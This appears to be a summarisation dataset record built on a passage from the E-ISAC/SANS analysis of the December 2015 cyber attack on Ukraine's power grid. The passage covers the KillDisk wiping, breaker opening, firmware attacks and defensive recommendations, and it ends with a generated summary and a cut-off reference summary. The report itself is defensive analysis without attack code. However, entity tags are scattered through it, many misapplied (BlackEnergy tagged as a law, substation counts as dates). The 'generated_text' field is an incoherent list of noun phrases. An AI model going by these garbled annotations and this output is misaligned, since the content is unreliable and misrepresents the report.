direct interaction with the [ORG] ICS components . They achieved this using existing remote administration tools on the operator workstations . The threat actors also continued to use the [ORG] VPN access into the IT environment.30 In final preparation for the attack , the adversaries completed the [ORG] Install / Modify stage by installing malicious software identified as a modified or customized [PRODUCT] KillDisk across the environment . While it is likely the attackers then ensured their modifications to the UPS were ready for the attack , there was not sufficient forensic evidence available to prove this . The last act of modification was for the adversaries to take control of the operator workstations and thereby lock the operators out of their systems . Figure [CARDINAL] 7 shows the static analysis of the [PRODUCT] KillDisk API imports following the event . Figure [CARDINAL] 7 : Static Analysis of [ORG] KillDisk [ORG] Identifying API Imports31Finally , to complete the ICS Cyber Kill Chain and to Execute the ICS Attack , the adversaries used the HMIs in the [GPE] SCADA environment to open the breakers . [CARDINAL] At [CARDINAL] least [CARDINAL] 27 substations ( the total number is probably higher ) were taken offline across the [CARDINAL] three energy companies , impacting [CARDINAL] roughly [CARDINAL] 225,000 customers.32 , [CARDINAL] 33 Simultaneously , the attackers uploaded the malicious firmware to the serial - to - ethernet gateway devices . This ensured that even if30url id=24508688 6&cat id=35109 [CARDINAL] 31 This image was provided by [PERSON] Jake [PERSON] Williams of [PERSON] Rendition [PERSON] InfoSec . It is included here to note that [ORG] KillDisk would not run properly in a malware sandbox for analysis . Static analysis was required to fully investigate the malware sample . [CARDINAL] 32 url [CARDINAL] 33 In analysis of the impact observed and on the available information on the [GPE] Ukrainian distribution grid it is assessed with medium confidence that the public number of disconnected substations , [DATE] 27 , is a low number . E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 20168ICS Cyber Kill Chain Mapping(We have characterizedthefirmware attacks againstthe operator workstations were recovered , remote commands could not be issued to bring the substations back online field communication devices as \u201c blowing the bridges \u201d ) . During this same period , the attackers also leveraged a remote telephonic denial of service on the energy company \u2019s call center with [CARDINAL] thousands of calls to ensure that impacted customers could not report outages . Initially , it seemed that this attack was to keep customers from informing the operators of how extensive the outages were ; however , in review of the entirety of the evidence , it is more likely that the denial of service was executed to frustrate the customers since they could not contact customer support or gain clarity regarding the outage . The entire attack from [DATE] March [DATE] 2015 \u2013 [DATE] December [DATE] 23 , [DATE] 2015 is graphically depicted below in Figure [DATE] 8.Figure [DATE] 8 : [ORG] ICS [ORG] Kill [ORG] Chain [ORG] Mapping ChartE - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 20169ICS Cyber Kill Chain MappingIt is extremely important to note that neither [LAW] BlackEnergy [LAW] 3 , unreported backdoors , [PRODUCT] KillDisk , nor the malicious firmware uploads alone were responsible for the outage . Each was simply a component of the cyber attack for the purposes of access and delay of restoration . For example , on some systems , [PRODUCT] KillDisk made the [PRODUCT] Windows systems inoperable by manipulating or deleting the master boot record , but on other systems it just deleted logs and system events.34 , [CARDINAL] 35 The actual cause of the outage was the manipulation of the [ORG] ICS itself and the loss of control due to direct interactive operations by the adversary . The loss of view into the system through the wiping of the [GPE] SCADA network systems simply delayed restoration efforts . In summary , Stage 2 consisted of the following attack elements:\uf0b7 Supporting attacks :o Schedule disconnects for UPS systems o [PERSON] Telephonic floods against [CARDINAL] at [CARDINAL] least [CARDINAL] one oblenergos \u2019 customer support [ORG] line\uf0b7 [ORG] Primary attack : [GPE] SCADA hijack with malicious operation to open breakers \uf0b7 Amplifying attacks :o [PRODUCT] KillDisk wiping of workstations , servers , and an [ORG] HMI card inside of an RTU o [ORG] Firmware attacks against Serial - to - Ethernet devices at substations34 url [CARDINAL] 35 url | Analysis of the Cyber Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 201610Defense Lessons Learned \u2013 Passive and Active DefensesWe reviewed the mitigation strategies provided through the DHS ICS - CERT Alert and considered how an adversary may alter the next attack based on the mitigation taken by a target . We support many of the mitigation recommendations provided to date . However , it is likely that the adversary will modify attack approaches in follow - on campaigns and these mitigation strategies may not be sufficient . In the following section , we discuss mitigations for the attack that took place to extract defense lessons learned . In addition , we discuss future potential attacker methodologies and provide recommendations that could disrupt similar adversary \u2019s operations . The mitigations will focus on recommendations for Architecture , [ORG] Passive [ORG] Defense , and Active Defense methodologies along [ORG] the [ORG] Sliding [ORG] Scale [ORG] of [ORG] Cyber [ORG] Security , shown in Figure [CARDINAL] 9.36Figure [CARDINAL] 9 : The Sliding Scale of Cyber SecuritySpear Phishing In the attack , the adversary delivered a targeted email with a malicious attachment that appeared to come from a trusted source to specific individuals within the organizations . Initial mitigation recommendations would point to end - user awareness training and ongoing phishing testing . Efforts to prevent malware have often recommended application whitelisting , which can be effective in [ORG] ICS environments if the [ORG] ICS vendor approves of the use . However , based on the details of this attack , application whitelisting would have had a limited role contained to the execution of initial dropper infections in network segments with infected workstations ( e.g. , users that received and activated infected spear phish emails ) where application whitelisting may be more challenging to implement . It is important to note that application whitelisting would not have deterred or prevented the [ORDINAL] second stage [ORG] ICS attacks that impacted the [NORP] Ukrainian oblenergos . In [CARDINAL] at [CARDINAL] least [CARDINAL] one instance , the attacker used a remote rogue client and approved OS - level remote admin features for other components of [ORG] the [ORG] The [ORG] Next [ORG] Attack The adversary may conduct follow - on attacks that pursue alternative forms of social engineering campaigns , like targeting the organization through large - scale phishing campaigns , using water - holing attacks , or conducting direct - call campaigns to users or the help desk . They could also leverage technical exploits not requiring social engineering of personnel.36 url | Analysis of the Cyber Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 201611Defense Lessons Learned \u2013 Passive and Active DefensesOpportunities to Disrupt The adversary will likely modify attacks to respond to increases or changes in the target \u2019s defenses . Defenders need to develop anticipatory responses to attack effects . Since the social engineering components of attacks targeted email and internet accessible cyber assets , these assets and the networks they reside on are untrusted contested territory . Communication with these untrusted areas should be segmented , monitored , and controlled . Operate under the assumption that the environment is accessible by the adversary and ensure appropriate defenses are in place to protect the operations and control environment from the adversary- controlled business cyber assets ( while some organizations inherently trust their business systems and networks , additional enforcement and scrutiny of these systems is necessary ) . Consider using sandboxing technology to evaluate documents and emails coming into the network , using proxy systems to control outbound and inbound communication paths , and limiting workstations to communicate only through the proxy devices by implementing perimeter egress access controls . In the attack , the adversary appears to have used [ORG] BlackEnergy 3 to establish a foothold and utilize keystroke loggers to perform credential theft . As an initial mitigation approach , we recommend that organizations obtain the [ORG] YARA rules for the latest IOCs . By using the [ORG] YARA forensic tool , organizations can search for [ORG] BlackEnergy 3 infections and then utilize antimalware removal tools to eliminate the malware from the infected assets . Defenders should be mindful of the time it takes to detect an infected host as the intruder may have already moved inside the network and secured additional methods to interact and communicate with the infected network . Organizations should change user and shared user passwords ( ensure that these steps are approved by operations and the vendor , and tested for impacts to operations and existing security controls ) . The Next Attack Adversaries with persistent access will simply use a different remote access [GPE] Trojan , an updated version of [LAW] BlackEnergy [LAW] 3 , or an alternate mode of credential attacks . To detect and mitigate adversary movement throughout an environment and account manipulation , mitigation efforts should be focused on directory ( e.g. , [WORK_OF_ART] Active [WORK_OF_ART] Directory , Domain , [ORG] eDirectory , and LDAP ) segmentation with organizational unit trust models . This approach would allow early detection and prevent some basic attacker approaches . Opportunities to Disrupt Monitor user account behavior , network and system communication , and directory - level activity with a focus on identifying abnormalities . Implement alarm capabilities with different priority - level alarms based on the risk of the systems associated with the alarms . It is important to note that [ORG] YARA is a forensics tool and is not a continuous monitoring solution . After the attackers achieved the necessary freedom of movement and action in the IT infrastructure , they began exfiltrating the necessary information and discovering the hosts and devices to devise an attack concept to hijack the [GPE] SCADA DMS to open breakers and cause a power outage . They followed this with destructive attacks against workstations , servers , and embedded devices that provide industrial communications in their distribution substations . The mitigation recommendation here is to understand where this type of information exists inside your business network and ICSs . Minimizing where the information resides and controlling access isE - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 201612Defense Lessons Learned \u2013 Passive and Active Defensesa priority for an [ORG] ICS dependent organization . The Next Attack Attackers may look deeper into the [ORG] ICS configuration and settings or controller and protection / safety logic . Ensure to maintain a vaulted copy of known good project files , control and safety logic , and firmware . Also using file integrity checkers to monitor access or sample loaded files for changes . Opportunities to Disrupt Realize that attackers may be able to develop additional attack approaches as they have learned a system and may have stolen information that allows for the development of more powerful future attacks . Defenders should examine their detection and response capabilities . Decision makers should review their restoration plans for attacks with the potential to go deeper into the [ORG] ICS and could result in damaged equipment . Identify new connections leaving the environment and previously unseen encrypted communications . Network Security Monitoring ( [ORG] NSM ) is a great active defense method of detecting exfiltration and ending an adversary \u2019s attack path before it disrupts the [ORG] ICS . Mitigation guidance based on the attacker approach used in this campaign recommends using [CARDINAL] two - factor authentication with user tokens to strengthen authentication . The Next Attack Attackers may begin looking for existing point - to - point [ORG] VPN implementations at trusted [ORDINAL] third party networks or through remote support employee connections where split tunneling is enabled . The immediate mitigation recommendation is to implement trusted jump host or intermediary systems with [ORG] Network [ORG] Access [ORG] Control ( [ORG] NAC ) enforcement . Additionally , a [ORG] VPN configuration approach that disables split tunneling should be enforced . Opportunities to Disrupt : Defenders are reminded that having remote access through a trusted connection is advantageous for an attacker . Begin by asking why each trusted communication path exists , evaluate the risk , and eliminate each path that does not have an identified need that outweighs the risk of having an attack path . For those communication paths that must remain , consider implementing time of use access for users . Implement the ability to disconnect these paths in an automated way after a defined period of time after access in granted , and a method to disconnect manually if needed . From a passive defense perspective , force choke points in the environment by ensuring that the remote VPNs enter into the environment through a dedicated remote access [ORG] DMZ . This ensures that traffic and connections can be monitored by active defenders using techniques such as network security monitoring to identify abnormalities in duration of connections , number of connections , and time the connections occur . Workstation Remote Access Based on the details provided , the adversaries used the organizations \u2019 workstations remotely ( while the attacker was physically remote , logically they were local to the host ) to conduct Stage 2 of the attack . Mitigation recommendations focus on disabling remote access at the host and at the perimeter firewall . E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 201613Defense Lessons Learned \u2013 Passive and Active DefensesThe Next Attack Adversaries may modify attack approaches to load additional remote access tools , utilize remote shell capabilities , and tunnel communications over authorized perimeter firewall communications . In response to this modified attack approach , mitigation efforts should focus on host based application aware firewalls , application whitelisting , and configuration management efforts to identify changes in the operation of an asset . Application whitelisting , if installed on the operator HMI to prevent installation of unauthorized remote access software , will not aid in the prevention of authorized software . Also , keep in mind that specific control system vendors may not approve of the whitelisting software . Opportunities to Disrupt As a defender prepares for a cyber asset within a trusted environment that may be compromised and remotely controlled , they must consider approaches to quickly move to a conservative operations environment where the ability to issue control signals from untrusted assets is paused . Proper architecture would dictate the ability to segment or disable activities such as remote connections , and unnecessary outbound communications , while conducting active defense mechanisms ; such as incident response prior to restoring operational control capabilities to known good assets . Control and Operate As the attackers utilized the operator [ORG] HMI \u2019s , they operated numerous sites under the control of the dispatcher . Mitigation approaches for this specific action would focus on application level logic requiring confirmation from the operator , or implement Area of Responsibility ( AoR ) limitations that only allow an operator to effect certain components of a system . For example : If an entity implemented [GPE] AoR on [CARDINAL] one operator workstation that provided east breaker control , and a [ORDINAL] second operator workstation that provided West breaker control , then an adversary positioned on [CARDINAL] one workstation would be limited to the AoR allowed on that specific workstation . Some vendor systems allow for [GPE] Username determined [GPE] AoR , [GPE] Workstation determined [GPE] AoR , and/or an intersection model that combines username and workstation identifier in [GPE] AoR authorization . There are variations amongst vendor systems in how authentication is handled within the local workstation , directory , or at the application . The Next Attack When an attacker identifies a workstation with application security controls in place that limits their capabilities , they may modify their attack to control the system directly by issuing or injecting control commands . Mitigation strategies for this approach would focus on communication path authentication or protocol authentication that would require commands to be issued from an authorized asset . Monitoring communication sessions between hosts can lead to early detection and investigation of suspicious communications . Opportunities to Disrupt Preparing for adversarial utilization of cyber assets , or communication paths to control and operate elements of an [ORG] ICS system , requires system defenders to develop a response approach that eliminates entire sections of cyber asset elements and networks in an effort to inhibit automated control and activate manual operations only . As adversaries learn the environment , they may issue test commands and interact with the [GPE] SCADA environment without the intention to disrupt it . For mitigation purposes , defenders must talk to operators and ask about abnormal occurrences , and from a passive defense perspective , ensure that logs are collected not only from the host but also from the [GPE] SCADA applications . Additionally , implement a log aggregation architecture that replicates log files from assets into a log correlation system . Finally , have active defenders routinely review these logs in conjunction with other monitoring activity throughout the [ORG] ICS to identify abnormalities . E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 201614Defense Lessons Learned \u2013 Passive and Active DefensesTools and Technology impacts The attackers used multiple approaches to impact communication tools , operator technology for restoration efforts , and facility infrastructure essential to many operator activities . Therefore , mitigation recommendations are varied . Items to focus on are:\uf0b7 Establishing filtering and response capabilities at telecom providers to activate during an ongoing [ORG] TDoSattack\uf0b7 [ORG] Disable remote management of field devices when they are not required.\uf0b7 Disconnect building control infrastructure systems from the [ORG] ICS network.\uf0b7 Consider the number of spares required for embedded systems to regain required communication orcontrol / protection . The Next Attack A subsequent attack may progress from resource consumption to a more direct communication path outage that affects communication capabilities . To mitigate this approach , defenders need to establish alternate communications infrastructure for essential service capabilities . After an attacker identifies increased security requirements for field device management , they may attempt to establish direct access to a field device through a local asset with connectivity or physical presence at the site for direct firmware manipulation . Mitigation strategies for this attack approach focus on electronic and physical access controls and the development of a rapid response capability during an attack or incident . Opportunities to Disrupt A determined adversary can impact remote assets either electronically or physically . A defender should develop strong recovery and restoration approaches to replace mission - critical cyber asset components . [CARDINAL] One option is to rely on inventory and mutual aid assistance from trusted peer organizations and/or suppliers . In cases where specific assets are not immediately recoverable , it is necessary to develop the ability to operate the larger system with operational islands that can be recovered in a timely manner . Defenders should have access to and visibility of the ICSs to be able to identify abnormal behavior around field device interaction . For example , uploading firmware outside of a scheduled downtime should be quickly observable . Firmware modifications over the network cause spikes in network traffic that active defenders should be consistently looking for . See Figure [CARDINAL] 10 for an example of a malicious firmware update to an industrial network switch . Even without knowing the baseline of normal activity , which defenders should have , it can be trivial to spot firmware updates in network data . E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 201615Defense Lessons Learned \u2013 Passive and [PRODUCT] Active [PRODUCT] DefensesFigure [PRODUCT] 10 : [ORG] Sample [ORG] Network I / O Data from a Malicious Firmware Update to an Industrial Ethernet Switch37Respond and Restore The cyber attacks performed against [CARDINAL] three [NORP] Ukrainian oblenergos were well planned and highly coordinated . The attacks consisted of several major elements with both enabling and supporting attack segments . The attackers were remote and interacted with multiple locations within each of their targets to include central and regional facilities . Distribution utilities traditionally have both central business and engineering office(s ) and a number of branch facilities used to support line crew , meter reading , bill payment , and distributed supervisory control operations . Certain types of cyber attacks designed to maliciously take over and operate a [ORG] SCADA DMS may be best performed in a distributed fashion at the lowest or most direct level ( from a local dispatch and [ORG] SCADA server out to the substations that are being monitored and controlled ) . Preparing for a high - tempo , multifaceted attack is not easy and it requires careful plan review , testing , integrated defense , and operations exercises . Rehearsing steps to more quickly sever or prevent remote access , to safely separate the ICSs from connected networks , or to contain and isolate suspicious hosts is critical . The Next Attack The next attack may purposefully differ in its approach to throw off or defeat the defender \u2019s plans and expectations . It is critical that defenders exercise and train against different scenarios and be aware that attackers are co - adaptive and creative . It is vital to develop capabilities with flexibility in mind . Opportunities to Disrupt / Restore [ORG] Operations personnel must be involved in planning for restoration from a successful Stage [CARDINAL] 2 ICS attack . Concepts to consider from an electric operations and engineering perspective include the following and are graphically depicted in Figure [CARDINAL] 11:\uf0b7 Cyber contingency analysis : Continuous analysis and preparing the system for the next event.\uf0b7 [PRODUCT] Cyber failure planning : Modeling and testing cyber system response to network and asset outages.\uf0b7 Cyber conservative operations : Intentionally eliminating planned and unplanned changes as well asstopping any potentially impactful processes.37 For a good discussion on exploits and malicious firmware updates for industrial ethernet switches see the research by [PERSON] Eireann [PERSON] Leverett , [PERSON] Colin [PERSON] Cassidy , and [PERSON] Robert [PERSON] M. [PERSON] Lee in the DEFCON presentation \u201c [PERSON] Switches [PERSON] Get [PERSON] Stitches \u201d here : url | Analysis of the Cyber Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 201616Defense Lessons Learned \u2013 Passive and Active Defenses\uf0b7 Cyber load shed : Eliminating unnecessary network segments , communications , and cyber assets that arenot operationally necessary.\uf0b7 [ORG] Cyber [ORG] Root [ORG] Cause [ORG] Analysis ( RCA ) : RCA forensics to determine how an impactful event occurred andensure it is contained.\uf0b7 Cyber Blackstart : Cyber asset base configurations and bare metal build capability to restore the cybersystem to a critical service [PERSON] state.\uf0b7 [PERSON] Cyber mutual aid : Ability to utilize information sharing and analysis centers ( ISACs ) , peer utilities , law enforcement and intelligence agencies , as well as contractors and vendors to respond to large - scale events . Figure [CARDINAL] 11 : Summary of the opportunities to disrupt the attackE - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [ORG] 201617RecommendationsArchitecture [ORG] Recommendations:\uf0b7 [ORG] Properly segment networks from each other.\uf0b7 [ORG] Ensure logging is enabled on devices that support it , including both IT and Operational Technology ( OT)assets.\uf0b7 Ensure that network architecture , such as switches , are managed and have the ability to capture datafrom the environment to support [ORG] Passive and Active Defense mechanisms.\uf0b7 Make backups of critical software installers and include an MD5 and SHA256 digital hash of theinstallers.\uf0b7 [ORG] Collect and vault backup project files from the network.\uf0b7 Test the tools and technologies that passive and active defense mechanisms will need ( such as digitalimaging software ) on the environment to ensure that it will not negatively impact systems.\uf0b7 Prioritize and patch known vulnerabilities based on the most critical assets in the organization.\uf0b7Limit remote connections only to personnel that need them . When personnel need remote access , ensure that if they do not need control that they do not have access to control elements . Use [CARDINAL] two - form authentication on the remote connections.\uf0b7 Consider use of a system event monitoring system , configured and monitored specifically for high - valueICS / [ORG] SCADA systems . [ORG] Passive [ORG] Defense [ORG] Recommendations:\uf0b7 [ORG] Application whitelisting can help limit adversary initial infection vectors and should be used when nottoo invasive to the ICSs.\uf0b7 DMZs and properly tuned firewalls between network segments will give visibility into the environmentand allow defenders the time required to identify intrusions.\uf0b7 [NORP] Establish a central logging and data aggregation point to allow forensic evidence to be collected andmade available to defenders.\uf0b7Implement alarm package priorities for abnormal cyber events within the control system.\uf0b7 Enforce a password reset policy in the event of a compromise especially for VPNs and administrativeaccounts.\uf0b7 Utilize up - to - date antivirus or endpoint security technologies to allow for the denial of known malware.\uf0b7 Configure an intrusion detection system so that rules can be quickly deployed to search for intruders . [ORG] Active [ORG] Defense [ORG] Recommendations:\uf0b7 [ORG] Train defenders to hunt for odd communications leaving the networked environment such as new [ORG] IPcommunications . E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [CARDINAL] 201618Recommendations\uf0b7 Perform network security monitoring to continuously search through the networked environment forabnormalities.\uf0b7 Plan and train to incident response plans that incorporate both the IT and [ORG] OT network personnel.\uf0b7 Consider active defense models for security operations such as the active cyber defense cycle.\uf0b7 Ensure that personnel performing analysis have access to technologies such as sandboxes to quicklyanalyze incoming phishing emails or odd files and extract indicators of compromise ( IOCs ) to search for infected systems.\uf0b7 Use backup and recovery tools to take digital images from a few of the systems in the supervisoryenvironment such as HMIs and data historian systems every [DATE] 6 - [DATE] 12 [DATE] months . This will allow a baseline of activity to be built and make the images available for scanning with new IOCs such as new [ORG] YARA rules on emerging threats.\uf0b7 Train defenders on using tools such as [ORG] YARA to scan digital images and evidence collected from theenvironment but do not perform the scans in the production environment itself . Good architecture and passive defense practices build a defensible [ORG] ICS ; active defense processes establish a defended [ORG] ICS environment . Countering flexible and persistent human adversaries requires properly trained and equipped human defenders . E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [CARDINAL] 201619Implications and ConclusionImplications for Defenders The remote cyber attacks directed against [GPE] Ukraine \u2019s electricity infrastructure were bold and successful . The cyber operation was highly synchronized and the adversary was willing to maliciously operate a [NORP] SCADA system to cause power outages , followed by destructive attacks to disable [ORG] SCADA and communications to the field . The destructive element is the [ORDINAL] first time the world has seen this type of attack against [ORG] OT systems in a nation \u2019s critical infrastructure . This is an escalation from past destructive attacks that impacted general - purpose computers and servers ( e.g. , [ORG] Saudi [ORG] Aramco , [ORG] RasGas , [PERSON] Sands [PERSON] Casino , and [ORG] Sony [ORG] Pictures ) . Several lines were crossed in the conduct of these attacks as the targets can be described as solely civilian infrastructure . [PERSON] Historic attacks , such as Stuxnet , which included destruction of equipment in the [ORG] OT environment , could be argued as being surgically targeted against a military target . Infrastructure defenders must be ready to confront highly targeted and directed attacks that include their own ICSs being used against them , combined with amplifying attacks to deny communication infrastructure and future use of their ICSs . The elements analyzed in the attack indicated that there was a specific sequence to the misuse of the ICSs , including preventing further defender use of the ICSs to restore the system . This means that the attacker \u201c burned the bridges \u201d behind them by destroying equipment and wiping devices to prevent automated recovery of the system . The attacks highlight the need to develop active cyber defenses , capable and well - exercised incident response plans , and resilient operations plans to survive a sophisticated attack and restore the system . Nothing about the attack in [GPE] Ukraine was inherently specific to [GPE] Ukrainian infrastructure . The impact of a similar attack may be different in other nations , but the attack methodology , [ORG] Tactics , Techniques , and [PERSON] Procedures ( TTPs ) observed are employable in infrastructures around the world . We have identified [CARDINAL] five themes for defenders to focus on as they consider what this attack means for their As defenders of ICSs , consider the sequence of events taken by the adversary in [DATE] the [DATE] months leading up to [DATE] December [DATE] 23 , [DATE] 2015 when this cyber operation targeting [GPE] Ukrainian electricity infrastructure was planned and developed . The operation relied upon intrusions that appear to have come from a broader access campaign conducted in [DATE] the [DATE] spring [DATE] of [DATE] 2015 . In a prolonged attack campaign , there are likely numerous opportunities to detect and defend the targeted system . The [CARDINAL] two - stage [ORG] ICS cyber kill chain helps note that in an [ORG] ICS environment , there is an increased window for the detection and identification of the most concerning attack types . The cyber attacks were conducted within [TIME] minutes of each other against [CARDINAL] three oblenergos , resulting in power outages affecting [CARDINAL] approximately [CARDINAL] 225,000 customers for [TIME] a [TIME] few [TIME] hours . While the total number of customers across [CARDINAL] three service territories does not add up to a significant number of customers or load across [GPE] Ukraine , there may be significance in target selection or specific loads . [CARDINAL] One critical element of this particular attack was its coordinated nature affecting [CARDINAL] three target entities and the thoroughness of the adversary sequence of events in achieving their goals . Important opportunities for defenders to disrupt the adversary \u2019s sequence of events were The cyber attacks were mislabeled as solely linked to [PRODUCT] BlackEnergy [PRODUCT] 3 and [PRODUCT] KillDisk . BlackEnergy 3 was simply a toolE - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [DATE] 201620Implications and Conclusionused in Stage 1 of the attacks and [PRODUCT] KillDisk was an amplifying tool used in Stage 2 of the attacks . BlackEnergy 3 malware was used to gain initial footholds into a multitude of organizations within [GPE] Ukraine and not just the [CARDINAL] three impacted oblenergos . It is unknown if the adversary had planned to use this access campaign to enable their operation or if achieving access was the motivation leading to the development of a concept to attack the Excessive focus on the specific malware used in this attack places defenders into a mindset in which they are simply waiting for guidance on the specific attack components so they can eliminate them . This attack could have been enabled by a variety of approaches to gain access and utilize existing assets within a target environment . Regardless of the initial attack vector , the [ORG] ICS tools and environment were ultimately used to achieve the desired effect , not the BlackEnergy 3 malware . The attack concept had to be able to work across multiple [ORG] SCADA DMS implementations and target common susceptible elements , such as storage overwrites for Windows - based operating system workstations and servers . The attackers likely developed destructive firmware overwrite techniques after discovering accessible embedded systems . There was likely a significant amount of unobservable adversarial testing performed prior to introducing the attack into the environment . Many capabilities were demonstrated throughout this attack , and they all provide specific lessons learned for defenders to take action on . Information sharing is key in the identification of a coordinated attack and directing appropriate response actions . Within the [GPE] Ukraine , an organization with the ability to enable appropriate information sharing and provide incident response guidance should be pursued . In [GPE] the [GPE] United [GPE] States and other countries with established information sharing mechanisms , such as [ORG] ISACs ( [ORG] Information [ORG] Sharing and [ORG] Analysis [ORG] Centers ) , the focus should be on maintaining and improving the information provided by asset owners and operators . This increased data sharing will enhance situation awareness within the sector , which will in turn lead to earlier attack detection and facilitate incident response . In many ways , the [NORP] Ukrainian oblenergos and their staff , as well as the involved [NORP] Ukrainian government members deserve congratulations . This attack was a world [ORDINAL] first in many ways , and the [NORP] Ukrainian response was impressive with all aspects considered . As the investigation and analysis of technical data continues and more information regarding this attack surfaces , the authors of this [ORG] DUC will update this report where appropriate in an effort to maintain the most accurate and beneficial guidance document possible for [ORG] ICS defenders . The E - ISAC will continue to provide credible reporting and guidance as well . E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [CARDINAL] 201621Appendix Information EvaluationCredibility : [CARDINAL] 538 The claims by the [NORP] Ukrainian government that outages in the service territory of the targeted electricity companies were caused by a series of cyber attacks have been confirmed . The claim was originally met with private skepticism by the SANS ICS team as [ORG] ICS organizations frequently have reliability issues and incorrectly blame cyber mechanisms such as malware found on the network that is unrelated to the outage . Early reporting on incidents is often rushed and stressful which leads to inaccurate claims . However , in the [GPE] Ukrainian case , there is a large amount of evidence available ; including malware samples , interviews with operators present during the incident , and confirmation by multiple private companies involved in the incident . Lastly , the [GPE] U.S. government has since also confirmed the attacks due to their own investigation . The most recent report released from DHS ICS - CERT39 cites direct interviews with \u201c operations and information technology staff and leadership at [CARDINAL] six Ukrainian organizations with [ORDINAL] first - hand experience of the event . \u201d Based on the information provided in the report,40 the [GPE] U.S. delegation interviewed and considered information from the [CARDINAL] three impacted organizations as well as others . The format of the interviews , and asset owner and operator discussions , indicated that \u201c the team was not able to independently review technical evidence of the cyber- attack . However , a significant number of independent reports from the team \u2019s interviews as well as documentary findings corroborate the events \u2026 \u201d.41 However , a large amount of technical information was made available to the larger community including indicators of compromise , malware samples , technical information about the [ORG] ICS itself and its components , and some samples of logs from the [ORG] SCADA environment.42 The majority of sources to date have relied upon initial attempts by [GPE] Ukrainian power entities to inform customers about the cause of the outage and sources derived from interviews with impacted entities . The [ORG] DHS report does not attempt to assign attacker attribution and neither will this [ORG] DUC . Amount of Technical Information Available : [CARDINAL] 443 A score of 4 has been assigned for the technical information available due to the fact that malware samples , observable [ORG] ICS impacts , technical indicators of compromise , and [ORDINAL] first hand interviews were available . The investigation also included a joint working group between the [NORP] Ukrainian government , impacted oblenergos , and [GPE] U.S. government representatives starting on [DATE] January [DATE] 18 , [CARDINAL] 2016.44 This amount of information was sufficient to confirm the attacks . However , it should be noted that there may be pieces of information missing due to the lack of visibility in various parts of the [ORG] ICS network . As an example , packet captures from the network during the attack and [ORG] field38 [ORG] Credibility of the information is rated in a scale from [ 0 ] Can not be determined , [ 1 ] Improbable , [ 2 ] Doubtful , [ [CARDINAL] 3 ] Possibly true , [ 4 ] Probably true , [ 5 ] Confirmed [CARDINAL] 39 url [CARDINAL] 40 SANS ICS team members have been able to view technical data in both public and [CARDINAL] non\u2010government private channels to confirm the existence of forensic data and the core components of the analysis based off of the data . [CARDINAL] 41 url [DATE] 42 It should be noted that many in the community would like access to internal forensic logs of the impacted oblenergos . This is an understandable request but it is extremely rare for impacted organizations to make such information publicly available . SANS ICS team members have been able to view technical data in both public and non - government private channels to confirm the existence of forensic data and the core components of the analysis based off of the data . [CARDINAL] 43 Amount of Technical Information Available is an analyst \u2019s evaluation and description of the details available to deconstruct the attack provided with a rating scale from [ 0 ] No specifics , [ [CARDINAL] 1 ] high - level summary only , [ [CARDINAL] 2 ] Some details , [ [CARDINAL] 3 ] Many details , [ 4 ] Extensive details , [ [CARDINAL] 5 ] Comprehensive details with supporting evidence [CARDINAL] 44 url app1?art id=245086886&cat id=35109E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 201622Appendix Information Evaluationdevice logging were not available . With this information even more about the technical minutia of the attack would be available . The amount of information available as well as the willingness by the impacted oblenergos and [NORP] Ukrainian government to share that information publicly was the most seen to date for a confirmed intentional cyber attack that impacted the operations of an [ORG] ICS . When considering the technical information provided , the authors of this [ORG] DUC have considered the larger public reporting of electricity customer outages within [GPE] Ukraine as a component of the validation and evidence necessary to demonstrate the attacker effects to the electricity system . The official public alert by [ORG] DHS corroborates prior reporting and is based on interviews and information exchanged with the impacted organizations . E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [DATE] 201623", "generated_text": "Analysis; the Cyber Attack; the Ukrainian Power Grid; December 23, 2015; a third party; access; SCADA systems; systems; the attack; a foreign attacker; the SCADA; Control; output; a remote access server; a new attack; the SCADA; other power systems; the system; the DC; the victim; a black screen; Command; control; the cyber attack; a technique; technique; scanning; the Internet; forensics; technical details; the SCADA; addresses; the attacker; the victim; the device; a firewall; the ICS; the attacker; the network; the threat; the potential threat; information; the defense; defenses; the document; recommendations.", "ref_text": "<START-1>In December 2015, cyber attacks caused power outages for 225,000 customers across 3 distribution utilities in Ukraine. The attacks involved spear phishing and custom malware including BlackEnergy3, KillDisk, and malicious serial-to-ethernet firmware. The attacks followed the ICS Cyber Kill Chain, first gaining access to IT networks and then attacking ICS components to cause effects. The attackers conducted long-term reconnaissance, stole credentials, and utilized VPNs to pivot to ICS networks. The core attack involved using operator HMIs to open breakers, wiping SCADA systems with KillDisk, and blowing up 